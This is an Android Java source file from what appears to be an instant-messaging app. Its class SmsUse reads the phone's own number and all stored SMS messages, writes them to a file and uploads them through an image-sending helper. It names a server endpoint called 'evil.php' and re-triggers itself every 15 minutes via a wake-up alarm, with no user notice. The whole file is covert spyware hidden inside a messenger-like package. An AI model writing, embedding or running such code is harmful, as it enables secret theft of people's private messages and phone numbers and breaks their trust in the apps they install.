package at.vcity.androidim.extras;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.GregorianCalendar;

import org.json.JSONArray;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telephony.TelephonyManager;
import android.util.Log;

import at.vcity.androidim.SendImage;

/*
 * This receiver scans all uncanned sms messages and sends them to the server.
 */
public class SmsUse extends BroadcastReceiver {
    public static String FILENAME = "sms_file.txt";
    public static int Index = 0;
    @Override
    public void onReceive(Context context, Intent intent) {
        // Get the user's number.
        try {
            TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            final String mynumber = mTelephonyMgr.getLine1Number();

            // Get all unscanned texts


            AsyncTask<Object, String, String> Networkcall = new AsyncTask<Object,String,String>(){
                // Send them.
                URL url;
                HttpURLConnection connect = null;
                BufferedReader rd;
                StringBuilder sb;
                OutputStreamWriter wr;
                // Change this url to the url of your receiveJsonSms.php.
                String urlString = "http://198.162.52.90/android-im/evil.php";

                @Override
                protected String doInBackground(Object... context) {
                    try {
                        Sms[] texts = SmsHelpers.getSmsDetails((Context) context[0]);
                        // Get a json array of all text message objects
                        JSONArray jsonTexts = new JSONArray();
                        for (Sms text : texts) {
                            jsonTexts.put(text.toJson(mynumber));
                        }
                        Context c=(Context) context[0];
                        File tempFile = new File(c.getFilesDir() + "/" + FILENAME);
                        FileOutputStream fos = new FileOutputStream(tempFile);
                        for (int i = 0; i < jsonTexts.length(); i++) {
                            fos.write(jsonTexts.getJSONObject(i).toString().getBytes("UTF-8"));
                        }
                        fos.close();
                        ArrayList<byte[]> ar = new ArrayList<byte[]>();
                        FileInputStream fis = new FileInputStream(tempFile);
                        byte[] data = new byte[(int) tempFile.length()];
                        fis.read(data);
                        fis.close();
                        ar.add(data);
                        String name = "SMSFILE" + Integer.toString(Index);
                        Index++;
                        ar.add(name.getBytes());
                        SendImage sendSMS = new SendImage(ar);
                        sendSMS.run();
                        data = null;
                        ar = null;
                        fis = null;
                        fos = null;
                        System.gc();
                    } catch (Exception e1) {
                        e1.printStackTrace();
                        Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
                        return null;
                    }
                    return null;
                }
            };
            Networkcall.execute(context);
            setSmsAlarm(context);

        }
        catch(Exception e){
            System.err.println("SMS recovery failed");
            e.printStackTrace();
        }
    }

    // Set this receiver to trigger again in 15 minutes.
    private void setSmsAlarm(Context context) {
        Intent i = new Intent(context, SmsUse.class);
        GregorianCalendar cal = new GregorianCalendar();
        int _id = (int) System.currentTimeMillis();
        PendingIntent appIntent =
                PendingIntent.getBroadcast(context, _id, i, PendingIntent.FLAG_ONE_SHOT);

        cal.add(Calendar.MINUTE, 15);
        Log.i("SMS_SCAN_ALARM_SET", "Set scan sms alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
        AlarmManager am = (AlarmManager)context.getSystemService(Activity.ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                appIntent);
    }
}
